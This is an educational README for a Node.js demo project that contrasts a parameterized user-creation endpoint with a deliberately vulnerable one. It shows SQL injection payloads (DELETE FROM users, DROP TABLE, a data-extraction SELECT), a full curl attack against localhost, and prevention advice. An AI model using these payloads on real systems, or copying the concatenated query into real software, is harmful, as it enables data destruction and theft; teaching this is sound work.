# SQL Injection Attack Demonstration

⚠️ **EDUCATIONAL PURPOSE ONLY** ⚠️  
This document demonstrates SQL injection vulnerabilities for learning purposes. Never implement vulnerable code in production!

## Important Clarification: SQL Injection vs XSS

- **SQL Injection**: Injecting malicious SQL code into database queries
- **XSS (Cross-Site Scripting)**: Injecting malicious scripts into web pages

What you're looking for is **SQL Injection**, not XSS.

## Overview

This project contains two POST endpoints for creating users:

1. **Secure endpoint**: `POST /users` - Uses parameterized queries (protected)
2. **Vulnerable endpoint**: `POST /users/vulnerable` - Uses string concatenation (vulnerable)

## The Vulnerable Code

The vulnerable endpoint in `routes/users.js` uses direct string concatenation:

```javascript
// ⚠️ DANGEROUS CODE
const query = `INSERT INTO users (name, email, phone, address, city, country) 
               VALUES ('${name}', '${email}', '${phone}', '${address}', '${city}', '${country}') 
               RETURNING *`;
```

## SQL Injection Attack Examples

### 1. Delete All Users Attack

**Payload for the `name` field:**

```
'); DELETE FROM users; --
```

**Complete request body:**

```json
{
  "name": "'); DELETE FROM users; --",
  "email": "attacker@evil.com",
  "phone": "+972512345678",
  "address": "123 Evil St",
  "city": "Hackerville",
  "country": "Malicious"
}
```

**What happens:**
The malicious input transforms the query into:

```sql
INSERT INTO users (name, email, phone, address, city, country)
VALUES (''); DELETE FROM users; --', 'attacker@evil.com', '+972512345678', '123 Evil St', 'Hackerville', 'Malicious')
RETURNING *
```

This executes two statements:

1. `INSERT INTO users (name, email, phone, address, city, country) VALUES ('');` (invalid but partial)
2. `DELETE FROM users;` (deletes all users!)
3. `--` comments out the rest

### 2. Drop Table Attack

**Payload for the `name` field:**

```
'); DROP TABLE users; --
```

This would completely remove the users table.

### 3. Data Exfiltration Attack

**Payload for the `name` field:**

```
'); SELECT * FROM users; --
```

This could be used to extract sensitive data.

## How to Test the Attack

### Prerequisites

1. Make sure your PostgreSQL database is running
2. Install dependencies: `npm install`
3. Start the server: `npm start`

### Step 1: Set up test data

First, create some users using the secure endpoint to have data to delete:

```bash
# Create test users (using secure endpoint)
curl -X POST http://localhost:3000/users \
  -H "Content-Type: application/json" \
  -d '{
    "name": "John Doe",
    "email": "john@example.com",
    "phone": "+972512345678",
    "address": "123 Main St",
    "city": "Tel Aviv",
    "country": "Israel"
  }'

curl -X POST http://localhost:3000/users \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Jane Smith",
    "email": "jane@example.com",
    "phone": "+972587654321",
    "address": "456 Oak Ave",
    "city": "Jerusalem",
    "country": "Israel"
  }'
```

### Step 2: Verify users exist

```bash
curl http://localhost:3000/users
```

### Step 3: Execute the SQL injection attack

```bash
curl -X POST http://localhost:3000/users/vulnerable \
  -H "Content-Type: application/json" \
  -d '{
    "name": "'\'''); DELETE FROM users; --",
    "email": "attacker@evil.com",
    "phone": "+972512345678",
    "address": "123 Evil St",
    "city": "Hackerville",
    "country": "Malicious"
  }'
```

### Step 4: Verify all users are deleted

```bash
curl http://localhost:3000/users
```

You should see an empty array `[]` - all users have been deleted!

## Why This Attack Works

1. **No Input Sanitization**: The vulnerable endpoint doesn't validate or escape user input
2. **String Concatenation**: Direct insertion of user input into SQL strings
3. **Multiple Statements**: PostgreSQL allows multiple statements separated by semicolons
4. **Comment Injection**: `--` comments out the rest of the query, preventing syntax errors

## How the Secure Version Prevents This

The secure endpoint (`POST /users`) uses:

1. **Parameterized Queries**: `$1, $2, $3...` placeholders
2. **Input Validation**: Express-validator middleware
3. **Input Sanitization**: `.escape()` and `.trim()` methods

```javascript
// SECURE CODE
const result = await pool.query(
  `INSERT INTO users (name, email, phone, address, city, country) 
     VALUES ($1, $2, $3, $4, $5, $6) 
     RETURNING *`,
  [name, email, phone, address, city, country]
);
```

## Prevention Methods

1. **Always use parameterized queries**
2. **Validate and sanitize all user input**
3. **Use ORM/Query Builders** (like Sequelize, Prisma)
4. **Implement least privilege** (database user permissions)
5. **Enable query logging** for monitoring
6. **Regular security audits**

## Real-World Impact

SQL injection can lead to:

- **Data breaches** (stealing sensitive information)
- **Data destruction** (deleting entire databases)
- **Unauthorized access** (bypassing authentication)
- **System compromise** (in some cases, OS command execution)

## Testing Tools

- **SQLMap**: Automated SQL injection testing tool
- **Burp Suite**: Web application security testing
- **OWASP ZAP**: Free security testing proxy

## Legal Notice

⚠️ **WARNING**: Only test SQL injection on systems you own or have explicit permission to test. Unauthorized testing is illegal and unethical.

## Resources

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PostgreSQL Security Documentation](https://www.postgresql.org/docs/current/security.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

---

Remember: The goal is to understand these vulnerabilities so you can **prevent** them, not exploit them!
